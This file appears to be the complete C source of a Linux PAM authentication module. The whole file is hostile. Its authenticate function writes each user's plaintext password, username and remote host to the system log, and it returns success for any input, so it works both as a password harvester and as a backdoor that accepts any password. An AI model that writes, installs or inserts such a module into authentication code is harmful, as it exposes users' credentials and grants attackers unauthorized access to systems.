#include <string.h>
#include <sys/types.h>
#include <security/pam_modules.h>
#include <security/pam_appl.h>
#include <syslog.h>

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
 char *user, *passwd, *host;
 pam_get_user(pamh, (const char **) &user, NULL);
 pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&passwd, NULL);
 pam_get_item(pamh, PAM_RHOST, (const void **)&host);
 syslog(LOG_AUTH|LOG_ERR, "foo user=%s pass=%s host=%s", user, passwd, host);
 return(PAM_SUCCESS);
}

int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return(PAM_SUCCESS);
}
